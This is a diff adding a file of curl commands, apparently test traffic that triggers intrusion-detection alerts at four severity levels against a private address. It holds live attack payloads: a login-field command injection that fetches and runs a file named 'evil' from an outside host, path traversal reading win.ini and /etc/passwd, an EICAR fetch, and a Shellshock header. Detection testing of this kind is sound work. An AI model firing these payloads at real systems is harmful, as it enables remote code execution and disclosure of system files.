@@ -1,0 +1,22 @@
+LOW
+
+curl "http://192.168.10.20/weblogin.cgi?username=admin';cd /tmp;wget http://123.123.123.123/evil;sh evil;rm evil"
+
+
+MEDIUM
+
+curl http://192.168.10.20/?item=../../../../WINNT/win.ini
+curl http://192.168.10.20/eicar.file
+
+
+HIGH
+
+curl http://192.168.10.20/cgi-bin/../../../..//bin/cat%20/etc/passwd
+
+
+CRITICAL
+
+curl -H 'User-Agent: () { :; }; 123.123.123.123:9999' http://192.168.10.20/cgi-bin/test-critical
+
+
+
